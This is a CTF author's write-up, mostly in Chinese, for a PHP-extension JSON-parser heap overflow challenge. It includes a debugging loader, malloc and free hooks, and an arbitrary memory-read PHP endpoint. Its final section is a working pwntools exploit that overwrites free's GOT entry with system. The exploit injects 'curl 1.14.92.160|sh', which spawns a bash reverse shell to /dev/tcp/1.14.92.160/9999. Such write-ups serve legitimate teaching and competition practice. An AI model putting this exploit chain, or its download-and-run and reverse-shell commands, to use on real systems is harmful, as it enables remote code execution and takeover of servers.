# Christmas Wishes

* [Christmas Wishes](#christmas-wishes)
   * [题目描述](#题目描述)
   * [出题思路](#出题思路)
   * [调试方案](#调试方案)
   * [getshell](#getshell)
   * [exp](#exp)

## 题目描述

圣诞许愿！请输入你的愿望吧！现在已经全面支持json格式！(漏洞利用脚本存在直接成功情况，请在本地搭建环境成功后尝试利用远程，远程环境每五分钟重启一次。)
Make a Christmas wish! Please enter your wish! Now has full support for json format! (Vulnerability exploit script exists direct success, please try to exploit the remote after a successful local build environment, remote environment restart every five minutes.)

题目分值：800

解题人数：6

## 出题思路

其实最开始没想做成一个php pwn题目，原本就是写了个json parser， 然后模拟一个大的项目中的用来处理json的一个小组件，里面存在漏洞， 构造个环境去利用。

在写完以后发现了一个parser_string位置的堆溢出漏洞，而且和`cve 2021 3156`一样。

![image-20220103005237802](https://s2.loli.net/2022/01/03/LuRnxqacFE8TIv7.png)

然后配合链表单向修改可以实现任意地址写，

![image.png](https://s2.loli.net/2022/01/03/cULSumZFydVgvWj.png)

在和[@AFKL](https://afkl-cuit.github.io/)简单讨论这个思路时提到可以直接做成一个php网站，由于本来的代码也是模块化出来的，于是很简单的修改成了一个php拓展，搭建出来目前这个样子。

原本elf版本的在文件 `JsonParse_elf`， php拓展在文件`jsonparser_php`， 

## 调试方案

因为是个so文件，编写了一个简单的loader进行调试

```c
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include <stdlib.h>

typedef struct reader {
    char *buf;
    int size;
    int offset;
} _reader;

int main(){
    void *handle = dlopen("modules/jsonparser.so", RTLD_LAZY);
    void *(* Parser)(void *temp);
    _reader *reader = malloc(0x10);
    char * json = malloc(0x100);
    int fd = open("./exp.json", 0);
    int size = read(fd, json, 0x100);
    reader->buf = json;
    reader->size = size;
    reader->offset = 0;

    Parser = dlsym(handle, "Parser");
    Parser(reader);
}
```

思路是通过重复删除机制构造堆布局，然后通过堆溢出覆盖Item_struct， 通过重复删除的双链表修改可以实现地址修改，将so文件的free_got改为system， 基本可以调试并得到exp， 



在出题过程中对远程docker环境的调试，

直接hook掉了malloc free函数， 在函数`zif_jsonparser_test2`位置增加代码即可，通过`php_printf`打印相关信息可以得到远程的堆环境，(文件在`jsonparser_patch.so`)

```
call 0x0000000000002504
0000000000002504 hook_malloc  

	push rdi;
	call 0x000000000002220;
	pop rsi;
	push rax;
	mov rdx, rax;
	lea rax, qword ptr [0x0000000000024B9]
	mov rdi, rax;
	call 0x00000000002230
	pop rax;
	ret;


call 0x0000000000002526
0000000000002526 hook_free   

	push rdi;
	mov rsi, rdi;
	lea rax, qword ptr [0x000000000024D9]
	mov rdi, rax;
	call 0x00000000002230
	pop rdi;
	call 0x0000000000002050;
	ret;
```

> 甚至在这个操作中还解决了一个bug

![image.png](https://s2.loli.net/2022/01/03/YvHV6ecm4MnzbXi.png)

> 图中可以看到， 最后free的堆块为 0x9200，向上找到size为0x40为item结构体， 而我们构造的溢出的字符串为0x17的 地址为0x91e0，于是可以直接向下覆盖， 修改掉这个结构体，利用delete_item位置。

![image.png](https://s2.loli.net/2022/01/03/AvkiGLwWQS1xRFg.png)

然后编写了个memory_detection的拓展 封装成api， 用于直接查看内存。

```c
PHP_FUNCTION(memory_detection)
{
	long var;
	ZEND_PARSE_PARAMETERS_START(0, 1)
		Z_PARAM_OPTIONAL
		Z_PARAM_LONG(var)
	ZEND_PARSE_PARAMETERS_END();

	php_printf("memeory detection: [%p]\n", var);
	void * p;
	for(int i=0; i<0x100; i++){
		p = var + i*8;
		php_printf("addr[%p]: \t%016llx\t%s\n", p, (long long)*(long long *)p, (char *)p);
	}
}
```

```php
<?php 
memory_detection(base_convert($_GET["addr"], 16, 10));
```

![image.png](https://s2.loli.net/2022/01/03/VWzI7vfjYRFnKtx.png)

## getshell

最后反弹shell， `bash -c '/bin/bash -i >& /dev/tcp/1.14.92.160/9999 0>&1'`, 

## exp

```python
from pwn import * 
import requests

# context.log_level='debug'
# context.terminal=['tmux', 'splitw', '-h']

# cn = process("./loader")

host = 'http://124.70.201.145:7777/'

cmd = '''
# b * Parser
# b * new_Object
b * delete_item
'''
def hhex(number):
    num = "{:0>16x}".format(number)
    tmp = [num[i:i+2] for i in range(0, 16, 2)][::-1]
    tmp2 = ["".join(tmp[i:i+2]) for i in range(0, 8, 2)]
    return "\\u" + "\\u".join(tmp2)


def printff(num):
    print("{:0>16x}".format(num))

# from /proc/self/maps
base = 0x7f872c6e2000
system     = base + 0x000000000002170
printf     = base + 0x000000000002230
free_got   = base + 0x000000000006028
bss = base + 0x00000000000632C


echohello = base + 0x0000000000004059


json = '''
{{
    "1": "aaaaaaa", 
    "2": "aaaaaaa", 
    "3": "aaaaaaa", 
    "4": "aaaaaaa", 
    "5": "aaaaaaa", 
    "6": "aaaaaaa", 
    "7": "aaaaaaa", 
    "8": "aaaaaaa", 
    "A": "aaaaaaa", 
    "A": "bbbbbbb",
    "A": 1, 
    "B": 2,
    "echo hello": "{pad1}\\\x00{pad2}{fake_item}"
}}
'''.format(
    pad1 = 'c' * 0x15, 
    pad2 = 'a'* (0x20 - 0x15), 
    # fake_item = "sh -i < /dev/tcp/81.69.0.47/9" + "\\u0000a" + hhex(echohello) + hhex(0) + hhex(printf) + hhex(free_got - 0x30)
    fake_item = "bash -c 'curl 1.14.92.160|sh'\\u0000"+'a'*1 + hhex(echohello) + hhex(0) + hhex(system) + hhex(free_got - 0x30)
)
'''
wlz@VM-0-4-ubuntu:~$ curl 1.14.92.160
bash -c '/bin/bash -i >& /dev/tcp/1.14.92.160/9999 0>&1'
'''


r = requests.post(host, data={'wishes': json})
print(r.status_code)
print(r.text)
print(json)

printff(system)
printff(printf)
printff(free_got)


# gdb.attach(cn, cmd)
# cn.sendline(json)
# cn.interactive()

```

